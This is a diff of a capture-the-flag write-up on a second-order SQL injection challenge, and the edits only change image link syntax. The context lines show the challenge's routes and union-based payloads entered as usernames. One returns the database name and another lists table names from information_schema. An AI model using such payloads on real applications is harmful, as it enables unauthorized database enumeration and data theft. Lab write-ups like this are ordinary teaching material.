@@ -1,22 +1,22 @@
-![[Pasted image 20230209095656.png|500]]
+![](<./img/Pasted image 20230209095656.png>)
 
 ```
 /?action=login
 ```
 
-![[Pasted image 20230209095849.png|400]]
+![](<./img/Pasted image 20230209095849.png>)
 
 ```
 /?action=reg
 ```
 
-![[Pasted image 20230209100007.png|400]]
+![](<./img/Pasted image 20230209100007.png>)
 
 ```
 /?action=index
 ```
 
-![[Pasted image 20230209100928.png|400]]
+![](<./img/Pasted image 20230209100928.png>)
 
 题目明示是二次注入，而唯一的回显点是`info`
 
@@ -37,7 +37,7 @@ username: ' union select database()#
 password: 
 ```
 
-![[Pasted image 20230209102931.png|400]]
+![](<./img/Pasted image 20230209102931.png>)
 
 ```
 username: ' union select group_concat(table_name) from information_schema.tables where table_schema = 'ctftraining'#
